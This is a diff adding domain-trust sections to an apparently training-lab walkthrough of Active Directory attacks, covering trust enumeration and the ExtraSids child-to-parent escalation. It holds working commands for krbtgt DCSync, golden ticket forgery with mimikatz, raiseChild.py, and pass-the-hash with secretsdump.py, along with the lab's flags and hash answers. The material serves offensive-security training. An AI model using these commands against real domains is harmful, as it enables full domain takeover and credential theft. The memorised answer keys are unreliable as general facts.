@@ -29,6 +29,10 @@
     1. [Privileged Access](#privileged-access)
     2. [Bleeding Edge Vulnerabilities](#bleeding-edge-vulnerabilities)
     3. [Miscellaneous Misconfigurations](#miscellaneous-misconfigurations)
+9. [Why So Trusting?](#why-so-trusting)
+    1. [Domain Trusts Primer](#domain-trusts-primer)
+    2. [Attacking Domain Trusts - Child -> Parent Trusts - from Windows](#attacking-domain-trusts---child---parent-trusts---from-windows)
+    3. [Attacking Domain Trusts - Child -> Parent Trusts - from linux](#attacking-domain-trusts---child---parent-trusts---from-linux)
 
 ## Initial Enumeration
 ### External Recon and Enumeration Principles
@@ -607,3 +611,119 @@ Here the 5 techniques analogy from the gemini.
     hashcat -m 18200 crack /usr/share/wordlists/rockyou.txt
     ```
     The answer is `Pass@word`.
+
+## Why So Trusting?
+### Domain Trusts Primer
+#### Tools
+1. activedirectory
+2. PowerView
+3. bloodhound
+#### Challenges
+1. What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL)
+
+    We can solve this by using built in `activedirectory` tool.
+
+    ```powershell
+    Import-Module activedirectory
+    Get-ADTrust -Filter *
+    ```
+
+    ![alt text](<Assets/Domain Trusts Primer 1.png>)
+
+    To identify a child domain, check the `IntraForest` section. If it's set to TRUE, it is a child domain. So the answer is `LOGISTICS.INLANEFREIGHT.LOCAL`.
+
+2. What domain does the INLANEFREIGHT.LOCAL domain have a forest transitive trust with?
+
+    Based on the previous image, the answer is `FREIGHTLOGISTICS.LOCAL`.
+
+3. What direction is this trust?
+
+    Both of them have `BiDirectional` trust.
+
+### Attacking Domain Trusts - Child -> Parent Trusts - from Windows
+#### Tools
+1. mimikatz
+2. PowerView
+3. Rubeus
+#### Technique
+To perform this attack after compromising a child domain (ExtraSids Attack), we need the following:
+
+- The KRBTGT hash for the child domain
+- The SID for the child domain
+- The name of a target user in the child domain (does not need to exist!)
+- The FQDN of the child domain.
+- The SID of the Enterprise Admins group of the root domain.
+
+With this data collected, the attack can be performed with Mimikatz. Here the analogy of this attack from gemini.
+
+1. Step 1: Gather Your Forgery Tools
+
+![alt text](<Assets/Attacking Domain Trusts - Child -\> Parent Trusts - from Windows - Step1.png>)
+
+2. Step 2: Forge the Golden Ticket (The Fake Passport)
+
+![alt text](<Assets/Attacking Domain Trusts - Child -\> Parent Trusts - from Windows - Step2.png>)
+
+3. Step 3: Use Your Fake Passport
+
+![alt text](<Assets/Attacking Domain Trusts - Child -\> Parent Trusts - from Windows - Step3.png>)
+
+#### Challenges
+
+1. What is the SID of the child domain?
+
+    We can use `PowerView` with `Get-DomainSID` function. The answer is `S-1-5-21-2806153819-209893948-922872689`.
+
+2. What is the SID of the Enterprise Admins group in the root domain?
+
+    We can use `PowerView` again to solve this. Here the command of it.
+
+    ```powershell
+    Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+    ```
+    The answer is `S-1-5-21-3842939050-3880317879-2865463114-519`.
+
+3. Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain
+
+    At this point, we have obtained the SID of the child domain and the SID of the Enterprise Admins group in the root domain. To perform ExtraSids Attack, we also need the krbtgt hash for the child domain. We can use `mimikatz` to get this hash.
+
+    ```powershell
+    mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt 
+    ```
+    We can copy the NTLM hash and use `mimikatz` again to perform ExtraSids Attack.
+
+    ```powershell
+    mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+    ```
+    Once we have the golden ticket, we can retrieve the flag with this command.
+
+    ```powershell
+    type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
+    ```
+    The answer is `f@ll1ng_l1k3_d0m1no3$`.
+
+### Attacking Domain Trusts - Child -> Parent Trusts - from Linux
+#### Tools
+1. raiseChild.py
+#### Challenges
+1. Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer.
+
+    To get the hash for bross, we first need to gain control of the parent domain. We can use `raiseChild.py` to get the administrator hash.
+
+    ```bash
+    /usr/local/bin/raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+    ```
+
+    ![alt text](<Assets/Attacking Domain Trusts - Child -\> Parent Trusts - from Linux 1.png>)
+
+    Once we have the administrator hash, we can use `secretsdump.py` to retrieve `bross's` hash.
+
+    ```bash
+    secretsdump.py INLANEFREIGHT.LOCAL/administrator@172.16.5.5 -just-dc-user bross -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf
+    ```
+    The answer is `49a074a39dd0651f647e765c2cc794c7`.
+
+
+
+
+
